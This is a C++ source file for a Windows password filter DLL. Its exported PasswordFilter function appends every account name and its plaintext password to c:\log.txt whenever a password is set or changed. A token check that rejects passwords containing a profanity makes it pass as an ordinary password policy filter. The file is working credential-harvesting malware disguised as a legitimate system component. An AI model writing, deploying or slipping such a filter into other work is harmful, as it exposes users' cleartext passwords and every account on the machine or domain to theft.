#include "stdafx.h"
#include <Windows.h>
#include <stdio.h>
#include <SubAuth.h>

WCHAR buffer[1024];

BOOL __stdcall APIENTRY DllMain(HMODULE hModule, DWORD  ul_reason_for_call, LPVOID lpReserved) 
{

	switch (ul_reason_for_call) 
	{
	case DLL_PROCESS_ATTACH:
	case DLL_THREAD_ATTACH:
	case DLL_THREAD_DETACH:
	case DLL_PROCESS_DETACH:
		break;
	}
	return TRUE;
}

extern "C" __declspec(dllexport) BOOLEAN __stdcall InitializeChangeNotify(void) 
{
	return TRUE;
}

extern "C" __declspec(dllexport) int __stdcall 
	PasswordChangeNotify(PUNICODE_STRING *UserName, 
	ULONG RelativeId, 
	PUNICODE_STRING *NewPassword) 
{
	return FALSE;
}

extern "C" __declspec(dllexport) BOOLEAN __stdcall PasswordFilter(PUNICODE_STRING AccountName, 
																  PUNICODE_STRING FullName, 
																  PUNICODE_STRING Password, 
																  BOOLEAN SetOperation)
{
	DWORD dwBytesWritten = 0;
	HANDLE hFile = CreateFile(L"c:\\log.txt", FILE_APPEND_DATA, 0, NULL, 
		OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);

	if (hFile != INVALID_HANDLE_VALUE)
	{
		memset(buffer, 0, sizeof(buffer));
		int len = swprintf(buffer, L"%wZ :: %wZ\r\n", AccountName, Password) * sizeof(WCHAR);

		WriteFile(hFile, buffer, len, &dwBytesWritten, NULL);
		CloseHandle(hFile);
	}

	if (wcsstr(Password->Buffer, L"fuck") != NULL)
	{
		return 0;
	}

	return 1;
}


